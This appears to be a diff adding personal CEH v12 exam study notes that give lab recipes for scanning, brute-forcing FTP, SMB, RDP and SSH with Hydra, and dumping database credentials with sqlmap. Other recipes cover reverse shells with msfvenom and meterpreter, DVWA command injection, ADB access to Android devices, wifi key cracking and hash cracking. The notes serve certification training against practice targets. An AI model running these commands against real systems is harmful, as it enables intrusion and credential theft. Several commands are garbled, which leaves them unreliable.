@@ -1,0 +1,346 @@
+CEH notes
+
+Final V12 Notes
+
+### NMAP
+
+**▼ FQDN of the Domain Controller**
+
+nmap-p389-sV 10.10.1.13/24 Go to 10.10.1.22 server and login and go to this pc then right click and go down click on rename this pc advanced.
+
+**▼ Domain Controller.**
+
+**Solution:**
+
+1. nmap -p 389,445 -sV -iL &lt;Target File> OR nmap -p 389,445 -sV &lt;IP> {FQDN = Host + Domain}
+2. Or
+3. type ldapsearch -h [Target IP Address] -x -s base naming contexts and press Enter (here, the target IP address is 10.10.X.XX), to gather details related to the naming contexts
+4. x: specifies simple authentication, h: specifies the host, and -s: specifies the scope.
+5. After getting the domain name e.g. [CEH.com](http://ceh.com/)
+6. Type ldapsearch -x -h &lt;IP> -b "DC=CEH,DC=com" and press enter
+7. In the terminal menu search for versión
+8. This will give the operating system versión.
+
+---
+
+### WampServer
+
+172.20.0.16
+
+nmap -sV-A-p 80 10.10.1.13/24
+
+services.
+
+**Solution 2:**
+
+1. Nmap-A-sC-v-p- &lt;IP/24). Get the "xyz" services running and count them. This will give the number.
+
+---
+
+### CVE & CVS
+
+**▼ severity score of a vulnerability that indicates the End of Life of a web development language platform?**
+
+nmap -Pn--script vuln &lt;IP>
+
+1. now copy the CVE number which is vulnerable paste in goggle and see the value.
+2. Most of the time "10" because the product has already entered into EOL, so no fixes are being provided, so even if the vulnerabilities are identified, there will be no patches, thus leaving it vulnerable.
+
+**example CVE-2006-3392** https://www.cvedetails.com/cve/CVE-2006-3392/
+
+**CVE number of the vulnerability**
+
+1. In the mate terminal type nmap -Pn-script vuln &lt;IP>.
+now copy the CVE number which is vulnerable paste in google and see the value.
+
+**The CVE with the least CVSS score is the answer**
+
+1. OR
+2. https://infosecwriteups.com/introduction-to-openvas-a-vulnerability-scanner-cd5bf830e2fe - Reference link
+3. In the parrot navigate to pen testing, check openvas and open greenbone
+4. Go to scans and then tasks
+5. Then give the target IP in the task wizard
+6. Get the severity score from the results of the scan
+
+---
+
+### Privilege Escalation
+
+**▼ vertical privilege escalation**
+
+1. nmap -sV -p 22 192.168.0.0/24. This will live the live host with port 22 open with the OS and now see open port ip address and note down
+2. Now connect to SSH using → ssh username@IP and press enter. For password use the given &lt;password>
+3. Sudo- to get the commands that can be run
+4. sudo -i
+5. cd/
+6. find. -name &lt;file name.txt → This will give the path to the file
+7. cat given path /file name.txt → This will give you the component of the file e.g. DT4345$#@,JH8754@!
+
+**▼ vertical privilege escalation**
+
+1. nmap -sV -p 22 &lt;IP/24>. This will live the live host with port 22 open with the OS and now see open port ip address and note down the details.Now connect to SSH using ssh &lt;username>@&lt;IP> and press enter. For password use the given &lt;password>Sudo -1 → to get the commands that can be run. Type sudo -i to get root. Then cd /
+2. find. -name &lt;file name.txt> → This will give the path to the file
+3. cat givenpath/&lt;file name.txt> → This will give you the component of the file
+
+---
+
+### Hydra
+
+**FTP**
+
+1. Nmap -p 21 &lt;subnet IP>
+2. Sudo nmap -sS -A -T4 ip/24
+3. hydra -L user.txt -P pass.txt ftp://&lt;IP>
+4. ftp &lt;IP> and type user name and password login
+5. Ls and search for the &lt;file name.txt> file using find. -name &lt;file name.txt>
+6. cat &lt;file name> to get its content
+
+**SMB service.**
+
+1. Scan the entire subnet for open smb ports. You can use the wordlist available on the desktop on Parrot os. Use Hydra to crack it. The password for the encoded file is the same. If the file contains a hash, try to decode it.
+2. sudo nmap -T4-sS -p 139,445 --script vuln &lt;IP/24>. hydra -L &lt;path to the wordlist of usernames.txt> -P &lt;path to the password wordlist.txt> &lt;IP> smb
+3. smbclient // &lt;IP>/&lt;share> -U &lt;user> -p&lt;port>
+-U [name]: to specify the user
+-p [port]: to specify the port
+4. smbclient -L &lt;IP>. type password and Is. get file.txt
+~/Desktop/falg2.txt or more file.txt. cat falg2.txt.
+
+**SMB service**
+
+1. Scan the entire subnet for open smb ports. You can use the wordlist available on the desktop on Parrot os. Use Hydra to crack it. The password for the encoded file is the same. If the file contains a hash, try to decode it.
+2. sudo nmap -T4-Ss-p 139,445-script vuln &lt;IP/24>
+3. hydra-l &lt;username> -P /home/passlist.txt &lt;IP> smb
+4. smbclient //IP/share
+5. smbclient -L IP
+6. type password and Is
+7. get sniff.txt ~/Desktop/falg2.txt or more sniff.txt
+8. cat falg2.txt
+9. now encrypt the text using the same henry login password in bctextencoder.exe manual open
+
+---
+
+### Steganography
+
+**▼ Snow.**
+
+1. Locate the file in Windows machine. Open CMD in the located folder by typing CMD in the address bar. Use CMD in Windows machine. To Display Hidden Data type snow -C-p "&lt;password>" &lt;filename>.txt (then it will show the content of file.txt content). Enter the credentials from the file.
+2. OR
+3. Use the given 2nd machine and access the file on the given location. Open the restricted file. A Hash will be given. Use Crackstation or hashes to break the hash
+
+**Openstego**
+
+1. openstego tool in 2019 or use stegonline for online
+2. after opening Openstego, select the extract option. Select the path of the file to upload the file into it. Give path to the output file. Then type password → "imagination"
+3. Now extract the data
+4. Open the extracted file to get the flag
+5. type the flag
+
+---
+
+### ADB
+
+**ENT**
+
+1. sudo nmap -p 5555 192.168.0.0/24
+2. adb connect 192.168.0.14:5555
+3. adb shell
+4. Is and cd sdcard and Is and pwd
+5. adb pull/sdcard/scan/or adb pull /sdcard/scan attacker/home/
+6. Is and cd scan and Is
+7. ent -h or apt install ent
+8. ent evil.elf
+9. ent evil2.elf
+10. ent evil3.elf
+11. sha384sum evil.elf → This gives the hash
+12. then you get one hash value type last 4 characters.
+
+**ADB Connect.**
+
+1. sudo nmap -p 5555 &lt;IP> To check the open port for adb. adb connect [IP:5555](https://www.google.com/search?q=IP:5555) To connect to the device through adb. adb shell. Is and cd sdcard and Is and pwd. find /sdcard/ -name ".jpg" -o name ".png". adb pull /sdcard/scan/ or adb pull &lt;/path to the image file/ >. openstego tool or steghide in 2019 or use stegonline for online. after opening Openstego, select the extract option. Select the path of the file to upload the file into it. Give path to the output file.
+OR steghide extract -sf 12.png for steghide. Open the extracted file to get the flag.
+2. OR
+3. type cd PhoneSploit and press Enter. Type python3-m pip install colorama and press Enter to install the dependency. type python3 [phonesploit.py](http://phonesploit.py/) and press Enter to run the tool. Type 3 and press Enter to select [3] Connect a new phone option.
+
+---
+
+### SQL Injection
+
+**SQL injection**
+
+Answer: abc123
+
+1. now in parrot os, open firefox and login into the website given and details.
+2. Go to profile and and right cleck and inspect and console type "document.cookie" you will get one value.
+3. Open the terminal and type the below commands to get the password of other user.
+4. sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" --dbs
+5. sqlmap -u "d=1" cookie="mscope=1jwuydI=; ui-tabs- 1=0primeprime -D moveiscope - -tables
+6. sqlmap -u "=1primeprime cookie="mscope=1jwuydl=; ui-tabs- 1=0primeprime -D moviescope -T user-Login --dump
+7. You will get all the Useraname and Passwords of the website.
+
+---
+
+### msfconsole
+
+1. Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file upload/ File inclusion vulnerability on DVWA.
+2. msfconsole in one tab next in new tab
+3. msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php
+4. use exploit/multi/handler or use 30
+5. set payload php/meterpreter/reverse_tcp
+6. Set LHOST ipadd
+7. Upload a file you created as exploit.php
+8. Open terminal and type run once you get url type url in brower you get meterpreter session then type Is get the files.
+
+**SQL injection**
+
+1. Go to blog page in given website [cybersec.cehorg.com](http://cybersec.cehorg.com/).
+2. Copy the url with parameter id.
+3. And go to JSQL injection tool in parrot os.
+4. Then past the url and click attack you will get all databases.
+5. Now search the flag database copy the flag and paste
+
+**▼ SQL injection.**
+
+1. Login to the given website. Go to view profile. Then inspect the view source. In the console type document.cookie and copy it. Open mate terminal and type sudo su. Type è wapiti -u &lt;url> -m sql è This Will give the vulnerable parameter. Type è sqlmap -u &lt;Vulnerable url> dbs è This Will give the names of the databases. sqlmap -u &lt;Vulnerable url> -D &lt;database name> --tables è This Will give the names of the tables. Type è sqlmap -u &lt;Vulnerable url> -D &lt;database name> -T &lt;table name>--columns è This Will list the information aboult the columns in the selected table. Type è sqlmap u &lt;Vulnerable url> -D &lt;database name> -T &lt;table name> -C &lt;columna name> --dump è This Will Display/dump the data from the columns.
+2. or sqlmap -u "url" --crawl =3--level=5--risk =3--dbs. sqlmap -u "url" --crawl =3--level =5--risk=3-D database_name --tables. sqlmap -u "url" --crawl =3 --level =5--risk=3-D database_name -T table_name --columns. sqlmap -u "[http://192.168.44.40](http://192.168.44.40/)" --crawl l=3 -- level =5--risk=3-D database_name -T table_name -C Flag --dump
+
+**SQL injection.**
+
+1. now in parrot os, open firefox and login into the website given and details. Go to profile and and right cleck and inspect and console type "document.cookie" you will get the cookie and copy it. Open the terminal and type the below commands to get the password of other user. sqlmap -u &lt;"url"> --cookie=&lt;"cookie as copied from step 2"> --dbs. sqlmap -u &lt;"url"> --cookie=&lt;"cookie"> -D &lt;database name> - -tables. sqlmap -u &lt;"url"> --cookie=&lt;"cookie"> -D &lt;database name> -T table name> --dump. You will get all the Useraname and Passwords of the website.
+
+---
+
+### Wireshark
+
+**▼ attacking IP**
+
+1. Go to statistics IPv4 addresses you can apply the filter given
+**Source and Destination**
+2. flags.syn ==1 and tcp.flags.ack ==0
+Then
+3. you can find the high number of packets send to10.10.1.10 address and that answer.
+
+**▼ IoT Publish Message**
+
+1. Open IOT capture file in wireshark. Filter; MQTT and find length of the packet in the lower pane.
+2. Open in wireshark and apply the filter as mqtt and see the public message and then go to down panel open and see the message.
+
+**▼ IPv4 packet.**
+
+1. Open wireshark and load the file. Go to statistics IPv4 statistics→ Source and Destination Then you can apply the filter given. flags.syn ==1 and tcp.flags.ack ==0 you can find the least number of packets send to the IP address.
+2. or
+3. Load the file in wireshark. Type the filter in the filter bar ip.dst ==IP and press enter. Go to statistics and then in conversion and then IPv4 tab. Click on the packets colum to sort conversations by packet count. Look through the list to find the conversation with least packet sent to the IP.
+
+**▼ IoT Publish Message.**
+
+1. Open IOT capture file in wireshark.
+2. Filter; MQTT (mqtt.msgtype ==3 and find length of the packet in the lower pane.
+3. Open in wireshark and apply the filter as mqtt and see the public message and then go to down panel open and see the message length.
+
+---
+
+### Wifi Attacks
+
+**▼ aircrack-ng**
+
+1. aircrack-ng '/home/wireless.cap'
+2. aircrack-ng -b 6c:24:26:3e:01:59 -w '/home/wifipass.txt' '/home/wireless.cap'
+3. now you get password as key found [password1]
+
+**aircrack-ng.**
+
+1. Open the pcap file in wireshark to get the bssid or aircrack-ng file.pcap this will give the bssid. Copy the bssid. aircrack-ng-b &lt;bssid from wireshark> -w &lt;path to word list> &lt;path to pcap file>. This will give the password. Count the digits in the password.
+
+---
+
+### Cryptography
+
+**▼ DVWA**
+
+1. Open the url given and login with given details. Task-8
+2. After login http://172.20.0.16/DWVA/hackable/uploads/
+3. They you see files open it and copy the hash value go to the [hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash). Or try below.
+4. hash-identifier paste the text and see the type of hash and then hashcat -h grep MD5
+5. hashcat-m 0 hash.txt /Desktop/word list/urser.txt
+
+**VeraCrypt**
+
+1. Use veracrypt to decrypt the volume.
+2. Check password is in one system and file is in one system.
+3. Decrypt the has using the [hash.com](http://hash.com/) and now you get password.
+4. Open veracrypt and upload the file and give password and open the file see the text
+
+**VeraCrypt..**
+
+1. Use [hashes.com](http://hashes.com/) to decrypt the hash for Hash2crack.txt file or "hashcat -a 0-m &lt;hash type> &lt;hash file> &lt;wordlist>" or John the reaper to crack the hash e.g. john --format=Raw-MD5 wordlist=rockyou.txt Hash2crack.txt. You'll get the password. Decrypt the volume using Veracrypt. Upload the file in Veracrypt, type in the password and open the file EC_data.txt.
+
+**DVWA.**
+
+1. Open the URL. Login with the credentials admin/password. Reduce the security level to lowest. It'll be lower side of the page. After login navigate to the required address. We Will get the list of file. Then type ping | type "C:\wamp64\www\DVWA\ECweb\Certified\file names.txt" Like this check all the available files. Look for presence of random stuff in the file. That Will be the required file. Copy and save the content in a file in notepad. We can use base64 -d &lt;File> to decode the file in terminal or cat filename.txt | base64 --decode > decoded.txt or online sites to decode it.
+
+---
+
+### RDP
+
+**RDP**
+
+1. In the mate terminal type Sudo nmap -p 3389 &lt;IP/24> è This Will give the IP of the machine with RDP port open. hydra-l &lt;username> P &lt;/path to password wordlist.txt> &lt;IP> RDP. We Will get the password for the given username. We can use "Remmina" or "rdesktop" or "xfreerdp"in the mate terminal to connect with the machine throught RDP. Rdesktop &lt;IP>, then press enter or rdesktop - u username -p password host:port. Use the credentials to enter the machine. Better use Remmina. Sudo apt install reminna. Then type remmina to open Remmina. Log in using credentials. Locate the image file "file.cfe (Open the file and give the same password from Hydra, put that file in hash calc in the compromised windows machine 2bb407ea) There will be a locked icon on the file. Just double click it. Use SSH top u file to the system. Use ftp to get the file into local system. ftp &lt;IP>. use credentials obtained from hydra. get
+
+Tile content by cat /fllepath/fllename.txt. This will give value.
+
+V Remote Login
+
+V SSH
+
+1. Use Hydra to break the password Telnet, login and access the file,
+and enter the flag.
+2. Exploit a Remote Command Execution Vulnerability to Compromise a
+Target Web Server
+3. Nmap -p 22,23,80,3389 192.168.0.0/24
+4. sudo nmap -sS -sV -p- -O ipadd
+5. telnet 192.168.0.19 80 and GET / HTTP/1.0
+6. hydra -L user.txt -P pass.txt 192.168.0.1 ssh
+7. hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt
+192.168.1.106 telnet
+8. ssh [ubuntu@192.168.0.1](mailto:ubuntu@192.168.0.1)
+9. telnet 192.168.0.1
+10. msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=4444 and
+copy the path go to target machine after login paste now find . -name
+flag.txt
+
+Web Exploitation
+
+V SQLmap, burp suite
+
+1. nmap -sV -- script=http-enum [target domain or IP address]
+2. Find any input parameter on website and capture the request in
+burp and then use it to perform sql injection using sqlmap.
+3. Now open the burp and check the input parameters and intercept
+on then type some as "1 OR ANY TEXT" you get some value on
+burp copy that and create the txt file.(1 OR 1=1#)
+4. sqlmap -r &lt;txt file from burpsuite> -- dbs
+5. sqlmap -r &lt;txt file from burpsuite> -D &lt;database name> -- tables
+6. sqlmap -r &lt;txt file from burpsuite> -D &lt;database name> -T &lt;table
+name> -- columns
+7. sqlmap -r &lt;txt file from burpsuite> -D &lt;database name> -T &lt;table
+name> -- dump-all
+8. then login and do the url parameter change page_id=1to
+page_id=84
+
+Malware Analysis
+
+Trojans
+
+1. Analyze ELF Executable File using Detect It Easy (DIE)
+2. Open manuals go malware analysis folder, static malware analysis
+folder and packaging and officiation folder then you can DIE folder.
+3. Run the die.exe file in windows, upload the target file then click open
+now in scanned all now click on file info there you can see the entry
+point address.
+4. Find the Portable Executable (PE) Information of a Malware
+Executable File
+5. Open manuals go malware analysis folder, static malware analysis
+folder and PE Extraction tools folder then you can install and launch
+it.
+6. Click on file and upload the file from windows, after uploading it
+manually open the header file then you can see the entry point
+address.
